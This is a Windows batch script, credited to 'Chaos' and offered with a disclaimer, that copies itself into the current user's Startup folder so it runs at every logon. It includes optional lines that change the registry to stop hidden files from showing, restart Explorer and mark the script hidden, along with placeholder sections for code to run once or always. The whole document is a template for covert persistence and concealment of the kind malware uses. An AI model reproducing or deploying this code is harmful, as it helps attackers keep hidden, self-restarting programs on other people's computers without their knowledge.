::This program will inject into startup, and run specified code.
::Code in startup is different from the injection code.
::Files can be hidden, and the option to hide hidden files can be enabled.
::I AM NOT RESPONSIBLE FOR MALICIOUS USE OF THIS PROGRAM
::Made by Chaos

@echo off

::Check if the file already exists in startup
cd C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
if exist %~nx0 (goto code) else goto clone
cls
:clone
copy %0 "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
cls

::OPTIONAL: DISABLE SHOW HIDDEN FILES - REMOVE REM TO ENABLE
REM reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Hidden /t REG_DWORD /d 2 /f
REM taskkill /f /im explorer.exe
REM start explorer.exe

::OPTIONAL: HIDE THE FILE - REMOVE REM TO ENABLE
REM attrib +h %~nx0

::CODE TO BE RUN ONCE
echo The file does not exist in startup, but now does.

goto code
::The code of the file in startup
:code

::CODE TO ALWAYS BE RUN
echo The file exists in startup!
pause
exit
